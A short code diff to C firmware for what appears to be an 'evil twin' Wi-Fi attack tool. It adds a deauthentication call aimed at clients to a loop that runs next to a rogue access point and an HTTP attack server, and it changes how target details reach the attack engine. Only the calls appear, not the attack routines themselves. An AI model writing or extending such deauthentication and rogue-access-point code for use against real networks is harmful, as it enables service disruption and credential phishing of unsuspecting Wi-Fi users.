@@ -5,7 +5,6 @@
 #include "admin_server.h"
 #include "server.h"
 #include "evil_twin.h"
-#include "wifi_attacks.h"
 
 
 /* Store target information */
@@ -56,11 +55,12 @@ static void evil_twin_task(void *pvParameters)
     http_attack_server_start();
 
     /* Start wifi attack engine */
-    wifi_attack_engine_start(target.bssid);
+    wifi_attack_engine_start((target_info_t * )&target);
 
     while(true)
     {
         wifi_attack_deauth_basic();
+        wifi_attack_deauth_client_negative_tx_power();
         vTaskDelay(pdMS_TO_TICKS(100));
     }
 }
